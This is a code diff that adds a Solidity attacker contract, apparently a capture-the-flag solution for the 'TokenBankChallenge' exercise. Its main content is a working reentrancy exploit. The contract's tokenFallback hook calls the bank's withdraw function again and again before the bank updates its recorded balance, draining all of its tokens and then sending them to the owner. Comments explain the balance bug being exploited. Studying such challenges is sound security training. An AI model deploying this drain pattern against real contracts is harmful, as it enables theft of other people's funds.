@@ -124,3 +124,66 @@ contract TokenBankChallenge {
         balanceOf[msg.sender] -= amount;
     }
 }
+
+contract TokenBankChallengeAttacker {
+    TokenBankChallenge public challenge;
+    SimpleERC223Token token;
+    address owner;
+
+    function TokenBankChallengeAttacker(address challengeAddress) public {
+        challenge = TokenBankChallenge(challengeAddress);
+        token = challenge.token();
+        owner = msg.sender;
+    }
+
+    function deposit() external payable {
+        uint256 myBalance = token.balanceOf(address(this));
+        // deposit is handled in challenge's tokenFallback
+        token.transfer(address(challenge), myBalance);
+    }
+
+    function attack() external payable {
+        callWithdraw();
+        // if something went wrong, revert
+        require(challenge.isComplete());
+    }
+
+    function tokenFallback(
+        address from,
+        uint256 value,
+        bytes calldata
+    ) external {
+        require(msg.sender == address(token));
+
+        // when attacker EOA deposits, ignore
+        if (from != address(challenge)) return;
+
+        callWithdraw();
+    }
+
+    function callWithdraw() private {
+        // this one is the bugged one, does not update after withdraw
+        uint256 myInitialBalance = challenge.balanceOf(address(this));
+        // this one from the token contract, updates after withdraw
+        uint256 challengeTotalRemainingBalance = token.balanceOf(
+            address(challenge)
+        );
+        // are there more tokens to empty?
+        bool keepRecursing = challengeTotalRemainingBalance > 0;
+
+        if (keepRecursing) {
+            // can only withdraw at most our initial balance per withdraw call
+            uint256 toWithdraw = myInitialBalance <
+                challengeTotalRemainingBalance
+                ? myInitialBalance
+                : challengeTotalRemainingBalance;
+            challenge.withdraw(toWithdraw);
+        }
+    }
+
+    function withdraw() external {
+        require(msg.sender == owner);
+        uint256 toTransfer = token.balanceOf(address(this));
+        token.transfer(owner, toTransfer);
+    }
+}
